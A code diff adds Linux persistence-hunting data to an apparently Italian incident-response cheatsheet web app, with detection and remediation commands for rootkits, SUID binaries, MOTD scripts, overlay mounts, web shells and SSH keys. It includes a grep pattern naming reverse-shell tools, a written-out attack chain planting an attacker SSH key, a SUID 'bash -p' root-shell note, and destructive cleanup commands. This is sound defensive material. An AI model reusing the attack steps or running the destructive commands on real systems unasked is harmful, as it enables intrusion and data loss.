+    {t:"Riferimenti a LD_PRELOAD nei file di startup, nei profili e nelle unit systemd.", y:"Bash", c:`grep -rE "LD_PRELOAD" /etc /home /root ~/.bashrc /etc/systemd/system/`},
+    {t:"Verifica l'integrità di tutte le librerie installate (Debian): individua .so sostituite con versioni malevole.", y:"Bash", c:`debsums -s 2>/dev/null | grep -v OK`},
+    {t:"Stessa verifica di integrità librerie su RHEL/CentOS.", y:"Bash", c:`rpm -Va 2>/dev/null | grep -v "^........"`},
+  ], remediation:[
+    {t:"Svuota ld.so.preload dopo averne salvato una copia come evidenza.", y:"Bash", c:`cp /etc/ld.so.preload /root/evidence_ld.so.preload.bak 2>/dev/null\n> /etc/ld.so.preload`},
+    {t:"Rimuove i riferimenti a LD_PRELOAD dai file di startup della shell.", y:"Bash", c:`sed -i '/LD_PRELOAD/d' ~/.bashrc /etc/profile.d/*.sh`},
+    {t:"Ricostruisce la cache delle librerie dinamiche dopo la pulizia.", y:"Bash", c:`ldconfig`},
+  ]},
+  { id:'kmods', name:'Kernel Modules', theory:{
+    paths:[
+      {p:"/lib/modules/$(uname -r)/", d:"file .ko installati per il kernel corrente"},
+      {p:"/etc/modules-load.d/", d:"caricamento automatico al boot (systemd)"},
+      {p:"/etc/modprobe.d/", d:"opzioni, alias e blacklist dei moduli"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Moduli kernel attualmente caricati in memoria.", y:"Bash", c:`lsmod | sort`},
+    {t:"Stessa lista filtrata per nomi tipici di rootkit (root, hide, hook, kit): un rapido controllo visivo sui moduli più sospetti.", y:"Bash", c:`lsmod | grep -iv "^Module"; lsmod | grep -iE '(root|hide|hook|kit)'`},
+    {t:"Metadata (file, descrizione, autore) di tutti i moduli attualmente caricati: un modulo senza autore o descrizione coerente è da investigare.", y:"Bash", c:`modinfo $(lsmod | awk 'NR>1{print $1}') 2>/dev/null | grep -E '(filename|description|author)'`},
+    {t:"File .ko più recenti dell'immagine kernel corrente: un modulo compilato dopo il kernel stesso è quasi sempre da investigare.", y:"Bash", c:`find /lib/modules -name "*.ko" -newer /boot/vmlinuz* 2>/dev/null`},
+    {t:"Configurazioni di caricamento automatico dei moduli al boot.", y:"Bash", c:`cat /etc/modules 2>/dev/null && ls /etc/modules-load.d/`},
+    {t:"Modifiche a blacklist, alias o install hook nei file modprobe.d: un attaccante può usarli per impedire il caricamento di moduli di sicurezza.", y:"Bash", c:`grep -rE "^blacklist|^alias|^install" /etc/modprobe.d/`},
+  ], remediation:[
+    {t:"Rimuove un modulo kernel malevolo dalla memoria (forzando la rimozione se necessario).", y:"Bash", c:`rmmod <modulo>   # oppure: rmmod -f <modulo>`},
+    {t:"Elimina il file .ko dal disco per impedirne un successivo caricamento.", y:"Bash", c:`rm /lib/modules/$(uname -r)/kernel/drivers/misc/<modulo>.ko`},
+    {t:"Ricostruisce le dipendenze dei moduli e l'initramfs dopo la rimozione.", y:"Bash", c:`depmod -a && update-initramfs -u`},
+  ]},
+  { id:'suid', name:'SUID & Integrità Pacchetti', theory:{
+    paths:[],
+    notes:[
+      "Un binario SUID di root eseguito da una posizione non standard (/tmp, /var/tmp, home utente) è uno dei segnali di escalation privilegi più diretti e immediati da verificare.",
+      "Se /bin/bash ha il bit SUID, un attaccante ottiene una shell root con /bin/bash -p. Riferimento tecniche di abuso binari: gtfobins.github.io",
+    ],
+  }, items:[
+    {t:"Tutti i binari con bit SUID impostato sul filesystem.", y:"Bash", c:`find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null`},
+    {t:"Tutti i binari con bit SGID impostato sul filesystem.", y:"Bash", c:`find / -perm -2000 -type f -exec ls -la {} \\; 2>/dev/null`},
+    {t:"Shell con bit SUID impostato: situazione critica, non dovrebbe mai verificarsi su un sistema pulito.", y:"Bash", c:`find / -perm -4000 \\( -name "bash" -o -name "sh" -o -name "zsh" \\) 2>/dev/null`},
+    {t:"File con bit SUID o SGID più recenti di /etc/passwd: molto probabilmente backdoor piantate dopo la compromissione iniziale.", y:"Bash", c:`find / -perm /6000 -type f -newer /etc/passwd -exec ls -la {} \\; 2>/dev/null`},
+    {t:"Verifica il bit SUID sui binari più comunemente abusati per l'escalation privilegi (GTFOBins).", y:"Bash", c:`ls -la /bin/bash /bin/sh /usr/bin/find /usr/bin/vim /usr/bin/python3 2>/dev/null | grep rws`},
+    {t:"File con Linux capabilities assegnate (es. cap_setuid): vettore di escalation privilegi alternativo al bit SUID, spesso trascurato in analisi manuali.", y:"Bash", c:`getcap -r / 2>/dev/null`},
+    {t:"Verifica integrità dei pacchetti installati (Debian): individua binari di sistema sostituiti rispetto all'originale del pacchetto.", y:"Bash", c:`debsums -c 2>/dev/null`},
+    {t:"Verifica integrità dei pacchetti installati (RHEL): un mismatch MD5 indica un binario sostituito.", y:"Bash", c:`rpm -Va 2>/dev/null | grep "^..5"`},
+    {t:"Calcola l'hash dei binari critici più sensibili all'escalation privilegi, da confrontare con una baseline nota.", y:"Bash", c:`sha256sum /usr/bin/sudo /usr/bin/su /usr/bin/ssh /bin/bash`},
+  ], remediation:[
+    {t:"Rimuove il bit SUID da un binario piantato in una posizione non standard e lo elimina.", y:"Bash", c:`chmod u-s /tmp/.bash && rm -f /tmp/.bash`},
+    {t:"Ripristina un binario di sistema sostituito reinstallando il pacchetto originale.", y:"Bash", c:`apt-get install --reinstall sudo   # adattare al pacchetto/binario coinvolto`},
+  ]},
+  { id:'motd', name:'MOTD', theory:{
+    paths:[
+      {p:"/etc/update-motd.d/", d:"script eseguiti come root ad ogni login SSH"},
+      {p:"/etc/pam.d/sshd", d:"deve contenere pam_motd.so perché gli script vengano eseguiti"},
+    ],
+    notes:[
+      {warn:true, text:"Gli script in /etc/update-motd.d/ vengono eseguiti come ROOT ad ogni login SSH, indipendentemente dall'utente che si connette: una posizione di persistenza ad altissimo valore."},
+      {warn:true, text:"Gli script MOTD terminano prima dell'avvio della shell SSH: i processi che generano hanno PPID=1, quindi risultano facilmente invisibili in un ps normale."},
+    ],
+  }, items:[
+    {t:"Elenco degli script presenti in update-motd.d e relativi timestamp di modifica.", y:"Bash", c:`ls -lah /etc/update-motd.d/; stat /etc/update-motd.d/*`},
+    {t:"Pattern sospetti (reverse shell, download) all'interno degli script MOTD.", y:"Bash", c:`cat /etc/update-motd.d/*; grep -rE "(bash -i|nc |wget|curl|/dev/tcp)" /etc/update-motd.d/`},
+    {t:"Verifica che pam_motd sia effettivamente richiamato nello stack PAM di sshd.", y:"Bash", c:`grep "pam_motd" /etc/pam.d/sshd`},
+    {t:"Script MOTD modificati più recentemente di /etc/passwd: forte indicatore di una modifica recente e sospetta.", y:"Bash", c:`find /etc/update-motd.d -newer /etc/passwd -ls`},
+    {t:"Processi orfani con PPID=1 non appartenenti a root al momento del login: possibile traccia di uno script MOTD malevolo già terminato.", y:"Bash", c:`ps -eo pid,ppid,user,cmd | awk '$2==1 && $3!="root"'`},
+  ], remediation:[
+    {t:"Rimuove uno script MOTD malevolo.", y:"Bash", c:`rm /etc/update-motd.d/99-malicious`},
+    {t:"Rimuove il richiamo a pam_motd se aggiunto in modo malevolo allo stack PAM di sshd.", y:"Bash", c:`sed -i '/pam_motd/d' /etc/pam.d/sshd`},
+  ]},
+  { id:'autostart', name:'Autostart Desktop', theory:{
+    paths:[
+      {p:"~/.config/autostart/", d:"voci .desktop di autostart per singolo utente"},
+      {p:"/etc/xdg/autostart/", d:"autostart system-wide (richiede privilegi root)"},
+      {p:"/usr/share/autostart/", d:"voci installate dai pacchetti"},
+      {p:"~/.local/share/autostart/", d:"posizione alternativa di autostart utente"},
+      {p:"~/.config/autostart-scripts/", d:"script di autostart specifici di KDE"},
+      {p:"/root/.config/autostart/", d:"autostart dell'utente root"},
+    ],
+    notes:[
+      "Su un server headless senza ambiente desktop, la sola presenza di voci di autostart è già di per sé anomala.",
+    ],
+  }, items:[
+    {t:"Voci Exec= configurate in tutte le posizioni di autostart, utente e di sistema.", y:"Bash", c:`grep -rE "^Exec=" /etc/xdg/autostart/ /home/*/.config/autostart/ 2>/dev/null`},
+    {t:"Voci di autostart che puntano a percorsi temporanei o cache: pattern tipico di persistenza desktop.", y:"Bash", c:`grep -rE "Exec=.*(\\/tmp|\\/dev\\/shm|\\.cache)" /home/*/.config/autostart/`},
+    {t:"Legge il contenuto completo di tutti i file .desktop presenti nelle posizioni di autostart note, per ispezionare manualmente il campo Exec=.", y:"Bash", c:`find /etc/xdg/autostart ~/.config/autostart ~/.local/share/autostart -name "*.desktop" -exec cat {} \\; 2>/dev/null`},
+  ], remediation:[
+    {t:"Rimuove una voce di autostart malevola per l'utente corrente.", y:"Bash", c:`rm ~/.config/autostart/malicious.desktop`},
+    {t:"Rimuove una voce di autostart malevola a livello di sistema.", y:"Bash", c:`rm /etc/xdg/autostart/malicious.desktop`},
+  ]},
+  { id:'overlay', name:'Overlay Mounts', theory:{
+    paths:[],
+    notes:[
+      "OverlayFS fonde una lowerdir (read-only, legittima) con una upperdir (scrivibile, potenzialmente dell'attaccante) in un'unica vista merged: i binari presenti in upperdir sovrascrivono silenziosamente quelli originali. Un hash calcolato sul path originale può risultare corretto, ma ogni processo vede comunque la versione malevola.",
+    ],
+  }, items:[
+    {t:"Elenco di tutti i mount overlay attivi sul sistema.", y:"Bash", c:`findmnt | grep overlay`},
+    {t:"Stessa informazione letta direttamente da /proc/mounts.", y:"Bash", c:`cat /proc/mounts | grep overlay`},
+    {t:"Mount overlay non riconducibili a Docker/containerd: potenziale overlay malevolo mascherato da containerizzazione legittima.", y:"Bash", c:`findmnt -t overlay -o TARGET,OPTIONS | grep -vE "docker|containerd|run"`},
+    {t:"Overlay montati sopra percorsi di sistema critici come /bin, /usr/bin, /lib, /etc, /sbin.", y:"Bash", c:`for p in /bin /usr/bin /lib /etc /sbin; do findmnt "$p" | grep overlay && echo "ATTENZIONE: $p"; done`},
+    {t:"File whiteout, usati da OverlayFS per nascondere i file originali sottostanti.", y:"Bash", c:`find / -name ".wh.*" 2>/dev/null`},
+    {t:"Mount overlay configurati per essere persistenti al riavvio tramite fstab.", y:"Bash", c:`grep overlay /etc/fstab`},
+    {t:"Confronta l'hash di un binario critico con l'eventuale versione presente nella upperdir sospetta.", y:"Bash", c:`sha256sum /usr/bin/sudo\nsha256sum /tmp/.x/usr/bin/sudo 2>/dev/null`},
+  ], remediation:[
+    {t:"Smonta l'overlay più esterno sul percorso interessato, ripristinando la visibilità dei file originali.", y:"Bash", c:`umount /usr/bin   # adattare al percorso interessato`},
+    {t:"Se gli overlay sono impilati, ripete lo smontaggio finché il percorso risulta pulito.", y:"Bash", c:`while findmnt /var/log | grep -q overlay; do umount /var/log; done`},
+    {t:"Rimuove la voce fstab che rende l'overlay persistente al riavvio.", y:"Bash", c:`sed -i '/overlay.*upperdir=\\/tmp/d' /etc/fstab`},
+    {t:"Elimina la upperdir malevola dopo averla salvata come evidenza.", y:"Bash", c:`rm -rf /tmp/.x/`},
+    {t:"Termina i processi che hanno ancora mappato in memoria il binario malevolo dell'overlay.", y:"Bash", c:`lsof | grep "overlay\\|/tmp/.x"\nkill -9 <PID>`},
+    {t:"Verifica che il binario originale sia di nuovo visibile e coerente con il pacchetto di sistema.", y:"Bash", c:`sha256sum /usr/bin/sudo && dpkg --verify sudo`},
+  ]},
+  { id:'webroots', name:'Web Roots / Web Shell', theory:{
+    paths:[
+      {p:"/var/www/html/", d:"web root predefinita di Apache/Nginx"},
+      {p:"/var/lib/tomcat*/webapps/", d:"deployment di applicazioni Java"},
+      {p:"uploads/ tmp/ cache/", d:"location di drop più comuni per una webshell"},
+      {p:"/etc/nginx/", d:"config Nginx — verifica include o location anomale"},
+      {p:"/etc/apache2/", d:"config Apache — controllare anche i file .htaccess"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"File .php/.py/.pl nella web root modificati più recentemente dei file di sistema base: individua webshell o backdoor caricate su un servizio web esposto.", y:"Bash", c:`find /var/www -name "*.php" -newer /etc/passwd 2>/dev/null | xargs ls -lah`},
+    {t:"Pattern tipici di webshell (eval su base64, esecuzione di comandi da variabili $_GET/$_POST) all'interno dei file PHP.", y:"Bash", c:`grep -rEl "eval\\(base64|system\\(\\$_|exec\\(\\$_|passthru" /var/www/`},
+    {t:"Variante più ampia dei pattern di webshell, che include anche popen e shell_exec tra le funzioni cercate.", y:"Bash", c:`grep -rE '(eval|base64_decode|system|passthru|shell_exec|exec|popen)\\s*\\(' /var/www/ 2>/dev/null | head -20`},
+    {t:"File PHP con codice offuscato tramite combinazione eval+base64: firma molto comune delle webshell pronte all'uso.", y:"Bash", c:`find /var/www -name "*.php" -exec grep -l "eval.*base64" {} \\;`},
+    {t:"File .htaccess nella web root e nelle directory di configurazione: verifica regole di redirect o di esecuzione forzata inserite da un attaccante.", y:"Bash", c:`find /var/www /etc/nginx /etc/apache2 -name ".htaccess" -exec cat {} \\;`},
+    {t:"Richieste POST verso endpoint PHP inattesi nei log del web server: utile per individuare l'interazione con una webshell già caricata.", y:"Bash", c:`grep "POST" /var/log/apache2/access.log | grep -vE "wp-login|api" | tail -30`},
+  ], remediation:[
+    {t:"Rimuove un file identificato come webshell dalla web root.", y:"Bash", c:`rm -f /var/www/html/.cache.php`},
+    {t:"Disabilita l'esecuzione di PHP nelle cartelle di upload, impedendo l'esecuzione di eventuali webshell future caricate lì.", y:"Bash", c:`echo "php_flag engine off" >> /var/www/html/uploads/.htaccess`},
+    {t:"Ripristina permessi non eseguibili su tutti i file della web root dopo la pulizia.", y:"Bash", c:`find /var/www/html -type f -exec chmod 644 {} \\;`},
+  ]},
+  { id:'tempdirs', name:'Temp Directories', theory:{
+    paths:[
+      {p:"/tmp/", d:"world-writable — location di staging più comune per i dropper"},
+      {p:"/dev/shm/", d:"memoria condivisa — in RAM, non su disco, elude molti scanner"},
+      {p:"/var/tmp/", d:"persiste tra i riavvii, a differenza di /tmp"},
+      {p:"/run/", d:"dati di runtime — verifica presenza di eseguibili inattesi"},
+    ],
+    notes:[
+      "Le directory temporanee sono superfici di staging, non un meccanismo di persistenza a sé stante: risali sempre al processo o al servizio che ha depositato i file qui.",
+    ],
+  }, items:[
+    {t:"Elenco completo di tutti i file presenti nelle directory temporanee del sistema.", y:"Bash", c:`ls -lah /tmp /dev/shm /var/tmp; find /tmp /dev/shm /var/tmp -type f -ls 2>/dev/null`},
+    {t:"Eseguibili presenti nelle directory temporanee del sistema.", y:"Bash", c:`find /tmp /dev/shm /var/tmp -perm /111 -type f -exec ls -la {} \\;`},
+    {t:"Dotfile nascosti nelle directory temporanee: /tmp e /dev/shm non dovrebbero normalmente contenere file di configurazione nascosti.", y:"Bash", c:`find /tmp /dev/shm -name ".*" -ls`},
+    {t:"Processi attualmente in esecuzione da una directory temporanea.", y:"Bash", c:`ps aux | awk '$11 ~ /\\/tmp|\\/dev\\/shm|\\/var\\/tmp/'`},
+    {t:"File cancellati dal filesystem ma ancora aperti da un processo: tecnica fileless per eseguire codice senza lasciare un binario recuperabile con un semplice ls.", y:"Bash", c:`lsof | grep "(deleted)"`},
+    {t:"Recupera un file cancellato-ma-aperto direttamente dal file descriptor del processo, prima di terminarlo.", y:"Bash", c:`cp /proc/<PID>/fd/<FD> /tmp/recovered_malware`},
+  ], remediation:[
+    {t:"Termina il processo che detiene aperto un file sospetto e lo rimuove.", y:"Bash", c:`fuser -km /tmp/file_sospetto && rm -f /tmp/file_sospetto`},
+    {t:"Rimuove una directory nascosta usata come staging area.", y:"Bash", c:`rm -rf /tmp/.hidden_dir/`},
+  ]},
+  { id:'sshauth', name:'SSH Keys & Config', theory:{
+    paths:[
+      {p:"~/.ssh/authorized_keys", d:"chiavi pubbliche autorizzate per l'utente"},
+      {p:"/root/.ssh/authorized_keys", d:"chiavi autorizzate per root"},
+      {p:"/etc/ssh/sshd_config", d:"configurazione del demone SSH"},
+      {p:"/etc/ssh/sshd_config.d/", d:"override drop-in — spesso trascurati durante l'analisi"},
+    ],
+    notes:[
+      {warn:true, text:"Esegui sempre sshd -t prima di riavviare sshd: una configurazione errata può bloccarti fuori dall'host."},
+      "Esempio di catena d'attacco: adduser nginx → usermod -aG sudo nginx → echo attacker_pubkey > /var/www/.ssh/authorized_keys — un account di servizio trasformato in utente sudo con una chiave SSH propria.",
+    ],
+  }, items:[
+    {t:"Chiavi SSH autorizzate per l'utente corrente.", y:"Bash", c:`cat ~/.ssh/authorized_keys 2>/dev/null`},
+    {t:"Chiavi SSH autorizzate di tutti gli utenti del sistema: individua backdoor via chiave SSH aggiunta da un attaccante.", y:"Bash", c:`find / -name "authorized_keys" 2>/dev/null | xargs cat`},
+    {t:"Dump di tutti gli authorized_keys in home e root, con il percorso di provenienza di ciascuna chiave stampato a video.", y:"Bash", c:`find /home /root -name "authorized_keys" -exec cat {} \\; -print`},
+    {t:"Timestamp di modifica degli authorized_keys più sensibili: una data recente e isolata è un forte indicatore di chiave aggiunta da un attaccante.", y:"Bash", c:`stat /root/.ssh/authorized_keys ~/.ssh/authorized_keys 2>/dev/null`},
+    {t:"Direttive sshd_config a più alto rischio: PermitRootLogin, ForceCommand, AuthorizedKeysCommand, GatewayPorts.", y:"Bash", c:`grep -rE "PermitRootLogin|ForceCommand|AuthorizedKeysCommand|GatewayPorts" /etc/ssh/`},
+    {t:"Variante centrata sulle direttive di autenticazione: PermitRootLogin, PasswordAuthentication, AuthorizedKeysCommand, ProxyCommand.", y:"Bash", c:`grep -E '(PermitRootLogin|PasswordAuthentication|AuthorizedKeysCommand|ProxyCommand)' /etc/ssh/sshd_config`},
+    {t:"Revisione completa della configurazione SSH, incluse le eventuali direttive client in ssh_config.d.", y:"Bash", c:`cat /etc/ssh/sshd_config; ls -lah /etc/ssh/ssh_config.d/`},
+    {t:"Rileva la presenza di AuthorizedKeysCommand: può servire chiavi nascoste ad ogni avvio di sshd, senza che compaiano in alcun authorized_keys.", y:"Bash", c:`grep -r "AuthorizedKeysCommand" /etc/ssh/`},
+    {t:"File SSH (chiavi e configurazione) modificati più recentemente dei file di sistema base.", y:"Bash", c:`find /etc/ssh /root/.ssh /home/*/.ssh -newer /etc/passwd | xargs ls -lah`},
+    {t:"Login riusciti tramite chiave pubblica registrati nel log di autenticazione.", y:"Bash", c:`grep "Accepted publickey" /var/log/auth.log* | awk '{print $1,$2,$3,$9,$11}'`},
+    {t:"Tentativi di login falliti recenti, utile per individuare attività di brute force.", y:"Bash", c:`grep "Failed password" /var/log/auth.log | tail -50`},
+    {t:"Tentativi di login falliti a livello di sistema, letti direttamente da btmp.", y:"Bash", c:`lastb -a | head -20`},
+  ], remediation:[
+    {t:"Elenca le impronte (fingerprint) delle chiavi presenti, per identificare con certezza quella da rimuovere prima di modificare il file.", y:"Bash", c:`ssh-keygen -l -f /root/.ssh/authorized_keys`},
+    {t:"Rimuove una chiave non autorizzata identificata tramite il suo commento o fingerprint.", y:"Bash", c:`grep -v "commento_attaccante" /root/.ssh/authorized_keys > /tmp/ak\nmv /tmp/ak /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys`},
+    {t:"Rimuove un drop-in di configurazione malevolo e verifica la sintassi prima di riavviare il demone.", y:"Bash", c:`rm /etc/ssh/sshd_config.d/99-override.conf\nsshd -t && systemctl restart sshd`},
+    {t:"Disabilita login diretto di root e autenticazione via password, forzando l'uso di chiavi.", y:"Bash", c:`sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config\nsshd -t && systemctl restart sshd`},
+  ]},
+  { id:'suspfiles', name:'Bash History & File Sospetti', theory:{
+    paths:[],
+    notes:[
+      "Usa questa sezione come rete di sicurezza generica quando un artefatto non rientra in nessuna categoria più specifica del dataset.",
+    ],
+  }, items:[
+    {t:"Storico dei comandi eseguiti dall'utente corrente.", y:"Bash", c:`cat ~/.bash_history`},
+    {t:"Storico dei comandi di tutti gli utenti del sistema.", y:"Bash", c:`for u in $(cut -f1 -d: /etc/passwd); do echo "== $u =="; cat /home/$u/.bash_history 2>/dev/null; done`},
+    {t:"File modificati nelle ultime 24 ore su tutto il filesystem (escluso /proc).", y:"Bash", c:`find / -xdev -mtime -1 -type f 2>/dev/null`},
+    {t:"File nascosti creati o modificati di recente rispetto ai file di sistema base.", y:"Bash", c:`find / -xdev -type f \\( -name ".*" -o -path "*/.*" \\) -newer /etc/passwd 2>/dev/null`},
+    {t:"Timestamp MACB (modifica, accesso, change, e birth se supportato dal filesystem) di un file sospetto: utile per costruire una timeline forense.", y:"Bash", c:`stat <file>`},
+    {t:"Calcola l'hash SHA256 di un file sospetto, da confrontare con IOC noti o interrogare su VirusTotal.", y:"Bash", c:`sha256sum <file>`},
+  ], remediation:[
+    {t:"Metti in quarantena un file sospetto rendendolo non eseguibile e spostandolo in una cartella di evidence, senza cancellarlo.", y:"Bash", c:`chmod 000 <file> && mkdir -p /root/quarantine && mv <file> /root/quarantine/`},
+  ]},
+  { id:'logs', name:'Logs & Investigation', theory:{
+    paths:[
+      {p:"journalctl -u <unit>", d:"storico di esecuzione di una specifica unit systemd"},
+      {p:"journalctl -b -1", d:"journal relativo al boot precedente"},
+      {p:"/var/log/auth.log*", d:"eventi SSH, sudo, PAM e su (Debian/Ubuntu)"},
+      {p:"/var/log/secure", d:"equivalente RHEL/CentOS di auth.log"},
+      {p:"last -a / lastb", d:"storico login (riusciti/falliti) con IP di provenienza"},
+      {p:"/var/log/audit/audit.log", d:"audit a livello di syscall, se auditd è attivo"},
+      {p:"/home/*/.bash_history", d:"storico dei comandi eseguiti dall'utente"},
+      {p:"/var/log/journal/", d:"journal persistente (default) — sopravvive ai riavvii"},
+      {p:"/run/log/journal/", d:"journal volatile — eliminato al riavvio"},
+    ],
+    notes:[
+      "Il nome del file journal contiene lo UID e un timestamp in hex: es. user-1000@...0061845834d5387.journal — l'ultimo valore hex diviso 1.000.000 dà l'epoch di inizio della entry.",
+    ],
+  }, items:[
+    {t:"Ultimi 100 eventi di sistema con dettaglio degli errori recenti.", y:"Bash", c:`journalctl -xe --no-pager | tail -100`},
+    {t:"Log del servizio SSH per verificare accessi e anomalie di autenticazione.", y:"Bash", c:`journalctl -u ssh -n 100 --no-pager`},
+    {t:"Log di una unit specifica relativi alle ultime 24 ore.", y:"Bash", c:`journalctl -u <nome-unit> --since "24 hours ago" --no-pager`},
+    {t:"Journal relativo al boot precedente: utile per verificare cosa è accaduto immediatamente prima di un riavvio sospetto.", y:"Bash", c:`journalctl -b -1 --no-pager | tail -200`},
+    {t:"Log di sistema generico su distribuzioni Debian/Ubuntu.", y:"Bash", c:`tail -100 /var/log/syslog`},
+    {t:"Log di sistema generico su distribuzioni RHEL/CentOS.", y:"Bash", c:`tail -100 /var/log/messages`},
+    {t:"Comandi sudo eseguiti negli ultimi 7 giorni, per individuare azioni con privilegi elevati fuori dall'ordinario.", y:"Bash", c:`journalctl --since "7 days ago" | grep "sudo.*COMMAND"`},
+    {t:"Tutte le esecuzioni di sudo registrate nel journal, limitate alla giornata odierna.", y:"Bash", c:`journalctl _COMM=sudo --since today --no-pager`},
+    {t:"Attività di login SSH degli ultimi 7 giorni.", y:"Bash", c:`journalctl -u sshd --since "7 days ago" | grep -iE "accepted|opened"`},
+    {t:"Eventi di autenticazione (accessi riusciti, falliti, non validi, apertura sessione) letti direttamente da auth.log.", y:"Bash", c:`grep -E '(Accepted|Failed|Invalid|session opened)' /var/log/auth.log | tail -50`},
+    {t:"Storico di esecuzione dei job cron, letto dal log di sistema.", y:"Bash", c:`grep "CRON" /var/log/syslog* | grep -v "^#"`},
+    {t:"Scritture su file critici come /etc/passwd o /etc/sudoers registrate da auditd.", y:"Bash", c:`ausearch -f /etc/passwd -i 2>/dev/null\nausearch -f /etc/sudoers -i 2>/dev/null`},
+    {t:"Installazioni di pacchetti recenti, utile per individuare software installato senza autorizzazione.", y:"Bash", c:`grep " install " /var/log/dpkg.log*   # Debian\ncat /var/log/yum.log* | grep "Installed"   # RHEL`},
+    {t:"Eventi SELinux/AVC recenti, se SELinux è attivo sul sistema.", y:"Bash", c:`ausearch -m avc -ts recent 2>/dev/null`},
+    {t:"Errori, warning e possibili indicatori di rootkit nel log del kernel a partire dall'ultimo boot.", y:"Bash", c:`journalctl -k --since "boot" | grep -iE '(error|warn|fail|rootkit)' --no-pager`},
+    {t:"Conferma l'esecuzione di un comando specifico correlando auditd/journal e log di autenticazione: utile per validare un IOC prima di scriverlo nel report.", y:"Bash", c:`ausearch -x <comando> -ts recent 2>/dev/null; journalctl _COMM=<comando> --no-pager; grep <comando> /var/log/auth.log`},
+  ], remediation:[
+    {t:"Copia i log critici in una posizione protetta prima di procedere con qualsiasi azione di remediation, per preservarne l'integrità.", y:"Bash", c:`tar czf /root/evidence_logs_$(date +%Y%m%d_%H%M%S).tar.gz /var/log/auth.log /var/log/syslog 2>/dev/null`},
+  ]},
+],
+dfir: []
+};
+
+/* =========================================================
+   STATO & UTILITY
+   ========================================================= */
+const state = { area:null };
+const $ = (sel,el=document)=>el.querySelector(sel);
+const $$ = (sel,el=document)=>Array.from(el.querySelectorAll(sel));
+
+function escapeHtml(str){
+  return String(str)
+    .replace(/&/g,"&amp;")
+    .replace(/</g,"&lt;")
+    .replace(/>/g,"&gt;")
+    .replace(/"/g,"&quot;")
+    .replace(/'/g,"&#39;");
+}
+
+/* Evidenzia i segnaposto variabili (es. <PID>, <host>) con un colore dedicato.
+   Il comando viene prima interamente escapato, poi solo i token <...> vengono
+   racchiusi in uno span colorato: il testo copiato negli appunti resta invariato. */
+function renderCommand(raw){
+  const escaped = escapeHtml(raw);
+  return escaped.replace(/&lt;([^&]+?)&gt;/g, '<span class="placeholder">&lt;$1&gt;</span>');
+}
+
+function truncate(str, n){
+  return str.length > n ? str.slice(0, n - 1) + '…' : str;
+}
+
+/* =========================================================
+   TEMA
+   ========================================================= */
+function initTheme(){
+  let saved = null;
+  try{ saved = localStorage.getItem('ir-cheatsheet-theme'); }catch(e){}
+  const theme = saved === 'light' ? 'light' : 'dark';
+  document.documentElement.setAttribute('data-theme', theme);
+  $('#themeToggle').textContent = theme === 'dark' ? '◐' : '◑';
+}
+$('#themeToggle').addEventListener('click', ()=>{
+  const cur = document.documentElement.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  document.documentElement.setAttribute('data-theme', next);
+  $('#themeToggle').textContent = next === 'dark' ? '◐' : '◑';
+  try{ localStorage.setItem('ir-cheatsheet-theme', next); }catch(e){}
+});
+
+/* =========================================================
+   CHECKLIST ESECUZIONE & OUTPUT INCOLLATO (persistiti)
+   ========================================================= */
+function loadState(key){
+  try{
+    const raw = localStorage.getItem(key);
+    return raw ? JSON.parse(raw) : {};
+  }catch(e){ return {}; }
+}
+const execState = loadState('ir-cheatsheet-exec');
+const outputState = loadState('ir-cheatsheet-output');
+
+function saveExecState(){ try{ localStorage.setItem('ir-cheatsheet-exec', JSON.stringify(execState)); }catch(e){} }
+function saveOutputState(){ try{ localStorage.setItem('ir-cheatsheet-output', JSON.stringify(outputState)); }catch(e){} }
+
+document.addEventListener('change', (e)=>{
+  const chk = e.target.closest('.exec-check');
+  if (!chk) return;
+  const id = chk.dataset.id;
+  execState[id] = chk.checked;
+  saveExecState();
+  const card = chk.closest('.card');
+  if (card) card.classList.toggle('done', chk.checked);
+});
+
+document.addEventListener('input', (e)=>{
+  const ta = e.target.closest('.output-box');
+  if (!ta) return;
+  const id = ta.dataset.id;
+  outputState[id] = ta.value;
+  saveOutputState();
+});
+
+/* =========================================================
+   RENDER
+   ========================================================= */
+function renderArea(area){
+  state.area = area;
+  document.documentElement.setAttribute('data-area', area);
+
+  $$('.area-tab').forEach(b=> b.classList.toggle('active', b.dataset.area === area));
+  $('#breadcrumb').textContent = `root@triage:~/${area}#`;
+
+  const catTabsEl = $('#categoryTabs');
+  const contentEl = $('#content');
+  catTabsEl.innerHTML = '';
+  contentEl.innerHTML = '';
+
+  if (area === 'dfir'){
+    catTabsEl.style.display = 'none';
+    contentEl.innerHTML = `
+      <div class="wip">
+        <div class="wip-icon">🚧</div>
+        <h2>Work in progress</h2>
+        <p>La sezione DFIR sarà popolata nei prossimi aggiornamenti.</p>
+      </div>`;
+    return;
+  }
+  if (area === 'parsing'){
+    catTabsEl.style.display = 'none';
+    contentEl.innerHTML = buildParsingView();
+    attachParsingHandlers();
+    return;
+  }
+  catTabsEl.style.display = 'flex';
+
+  const cats = DATA[area];
+  cats.forEach(cat=>{
+    const tab = document.createElement('button');
+    tab.className = 'cat-tab';
+    tab.dataset.cat = cat.id;
+    tab.textContent = cat.name;
+    tab.addEventListener('click', ()=>{
+      document.getElementById(`sec-${area}-${cat.id}`).scrollIntoView({behavior:'smooth', block:'start'});
+    });
+    catTabsEl.appendChild(tab);
+  });
+
+  cats.forEach(cat=>{
+    const section = document.createElement('section');
+    section.className = 'section';
+    section.id = `sec-${area}-${cat.id}`;
+
+    const head = document.createElement('div');
+    head.className = 'section-head';
+    const remCount = (cat.remediation && cat.remediation.length) || 0;
+    head.innerHTML = `<h2>${escapeHtml(cat.name)}</h2><span class="count">${cat.items.length} comandi${remCount ? ' + ' + remCount + ' remediation' : ''}</span>`;
+    section.appendChild(head);
+
+    const hasTheory = cat.theory && ((cat.theory.paths && cat.theory.paths.length) || (cat.theory.notes && cat.theory.notes.length));
+    const hasRem = cat.remediation && cat.remediation.length;
+
+    if (!hasTheory && !hasRem){
+      /* Layout semplice a colonna singola (retrocompatibile, es. area Windows) */
+      const list = document.createElement('div');
+      cat.items.forEach((item, idx)=> list.appendChild(buildItemCard(area, cat, item, idx, 'main')));
+      section.appendChild(list);
+      contentEl.appendChild(section);
+      return;
+    }
+
+    const cols = document.createElement('div');
+    cols.className = 'section-cols';
+    const templates = [];
+
+    if (hasTheory){
+      templates.push('1fr');
